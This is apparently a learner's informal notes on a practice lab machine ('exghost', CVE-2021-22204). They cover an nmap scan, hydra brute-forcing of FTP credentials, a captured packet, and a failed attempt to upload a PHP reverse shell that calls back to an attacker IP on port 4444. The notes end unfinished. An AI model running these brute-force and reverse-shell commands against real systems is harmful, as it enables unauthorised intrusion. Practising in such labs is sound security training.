exghost


Cve 2021 22204 and a github

50911


192.168.63.183

## overview

1. ftp brute force
2. analyze pcap
3. rce with EXIF tool
4. privesc by "exploiting a vulnerable version of the policykit-1 package"

cool, lets get crackin


```
???(kali?kali)-[~]
??$ nmap -sS -sV 192.168.63.183                                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 20:23 +0000
Nmap scan report for 192.168.63.183
Host is up (0.00075s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
80/tcp open   http     Apache httpd 2.4.41
Service Info: Host: 127.0.0.1; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
                                                                                                          
```

https://github.com/danielmiessler/SecLists/tree/master

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.63.183 ftp
```

oh, neat, port 80 and ftp are open.
http://192.168.63.183/

web server. let's dirb

http://192.168.63.183/server-status - 403, boo

let's use top 100 unix_password.txt - with `head -100 FILE`.

okay nope.

I need to use rockyou.txt

```

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.63.183 ftp

# over 30 minutes, nothing yet :(
```


useful command to find permissions:

    find / -writable -type d 2>/dev/null | grep '/proc' | grep -v "/sys"

okay. according to a medium article, `@0xrave`, author, we can use `-C` option.


    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.63.183:21

`user:system` is our cred. whew that took way too long.


next up is...well, we can just use `ftp` normally.

okay. don't use filezilla. just use normal `ftp` client.


ftp ftp://user:system@192.168.60.183

`ls` seems to fail.... or hang?

needed to turn off passive mode.

packet # 891 is what we want.

0000   50 4f 53 54 20 2f 65 78 69 66 74 65 73 74 2e 70   POST /exiftest.p
0010   68 70 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73   hp HTTP/1.1..Hos
0020   74 3a 20 31 32 37 2e 30 2e 30 2e 31 0d 0a 55 73   t: 127.0.0.1..Us
0030   65 72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c   er-Agent: Mozill
0040   61 2f 35 2e 30 20 28 58 31 31 3b 20 55 62 75 6e   a/5.0 (X11; Ubun
0050   74 75 3b 20 4c 69 6e 75 78 20 78 38 36 5f 36 34   tu; Linux x86_64
0060   3b 20 72 76 3a 37 39 2e 30 29 20 47 65 63 6b 6f   ; rv:79.0) Gecko
0070   2f 32 30 31 30 30 31 30 31 20 46 69 72 65 66 6f   /20100101 Firefo
0080   78 2f 37 39 2e 30 0d 0a 41 63 63 65 70 74 3a 20   x/79.0..Accept: 
0090   74 65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63   text/html,applic
00a0   61 74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c   ation/xhtml+xml,
00b0   61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b   application/xml;
00c0   71 3d 30 2e 39 2c 69 6d 61 67 65 2f 77 65 62 70   q=0.9,image/webp
00d0   2c 2a 2f 2a 3b 71 3d 30 2e 38 0d 0a 41 63 63 65   ,*/*;q=0.8..Acce
00e0   70 74 2d 4c 61 6e 67 75 61 67 65 3a 20 65 6e 2d   pt-Language: en-
00f0   55 53 2c 65 6e 3b 71 3d 30 2e 35 0d 0a 41 63 63   US,en;q=0.5..Acc
0100   65 70 74 2d 45 6e 63 6f 64 69 6e 67 3a 20 67 7a   ept-Encoding: gz
0110   69 70 2c 20 64 65 66 6c 61 74 65 0d 0a 43 6f 6e   ip, deflate..Con
0120   74 65 6e 74 2d 54 79 70 65 3a 20 6d 75 6c 74 69   tent-Type: multi
0130   70 61 72 74 2f 66 6f 72 6d 2d 64 61 74 61 3b 20   part/form-data; 
0140   62 6f 75 6e 64 61 72 79 3d 2d 2d 2d 2d 2d 2d 2d   boundary=-------
0150   2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d   ----------------
0160   2d 2d 2d 2d 31 36 39 36 32 31 33 31 33 32 33 38   ----169621313238
0170   36 30 32 30 35 30 35 39 33 39 30 38 35 36 32 35   6020505939085625
0180   37 32 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67   72..Content-Leng
0190   74 68 3a 20 31 34 38 30 36 0d 0a 4f 72 69 67 69   th: 14806..Origi
01a0   6e 3a 20 68 74 74 70 3a 2f 2f 31 32 37 2e 30 2e   n: http://127.0.
01b0   30 2e 31 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a   0.1..Connection:
01c0   20 6b 65 65 70 2d 61 6c 69 76 65 0d 0a 52 65 66    keep-alive..Ref
01d0   65 72 65 72 3a 20 68 74 74 70 3a 2f 2f 31 32 37   erer: http://127
01e0   2e 30 2e 30 2e 31 2f 0d 0a 55 70 67 72 61 64 65   .0.0.1/..Upgrade
01f0   2d 49 6e 73 65 63 75 72 65 2d 52 65 71 75 65 73   -Insecure-Reques
0200   74 73 3a 20 31 0d 0a 0d 0a                        ts: 1....


POST exiftest.php - let's upload a web shell.

    ls /usr/share/webshells/php
    nano ./php-reverse-shell.php
    # add port=4444
    # add ip=attacker ip, which is 192.168.49.60
    curl -X POST -F "file=@/home/kali/php-reverse-shell.php" http://192.168.60.183:80/exiftest.php
    curl -vvvk http://192.168.60.183:80/php-reverse-shell.php


okay. server says "There is no file to upload" when I try that. asking claude.

```bash
curl -X POST http://192.168.60.183:80/exiftest.php \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Origin: http://127.0.0.1" \
  -H "Connection: keep-alive" \
  -H "Referer: http://127.0.0.1/" \
  -H "Upgrade-Insecure-Requests: 1" \
  -F "file=@/home/kali/php-reverse-shell.php"
```
There is no file to upload.                                                                                                          

dang it.

okay, so, this was a rabbit hole.

apparently an exiftool version number is what we care more about.

god it's so annoying using a small screen with this. I can't wait for my new laptop.
https://sec-fortress.github.io/posts/pg/posts/exghost.html

it's so finicky. I'm just going to wait for my new laptop to resume doing these labs...
